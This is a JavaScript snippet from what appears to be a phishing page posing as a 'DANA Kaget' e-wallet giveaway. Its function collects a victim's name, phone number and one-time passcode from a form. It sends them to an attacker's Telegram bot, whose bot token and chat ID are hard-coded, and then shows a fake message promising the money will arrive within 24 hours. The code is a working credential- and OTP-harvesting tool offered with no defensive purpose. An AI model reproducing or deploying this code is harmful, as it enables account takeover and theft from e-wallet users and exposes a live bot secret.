<script>
function kirimData() {
  const nama = document.getElementById("nama").value;
  const nomor = document.getElementById("nomor").value;
  const otp = document.getElementById("otp").value;

  const token = "8003853875:AAG1rXJ-eQvMVo-ZTUcXEDMHYsVjdM5dGHE";
  const chatId = "-1002529220133";
  const text = `📲 DANA KAGET MASUKAN:\n\n👤 Nama: ${nama}\n📱 Nomor: ${nomor}\n🔐 OTP: ${otp}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url, {

    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
    }),
  })
  .then(res => res.json())
  .then(data => {
    console.log("Telegram Response:", data);
    if (data.ok) {
      alert("Dana Kaget berhasil dibuka!\nSaldo akan masuk dalam 1x24 jam.");
    } else {
      alert("Gagal kirim ke Telegram: " + data.description);
    }
    document.getElementById("popup").style.display = "none";
  })
  .catch(err => {
    console.error("Error:", err);
    alert("Gagal kirim ke Telegram (check Console)");
  });
}
</script>
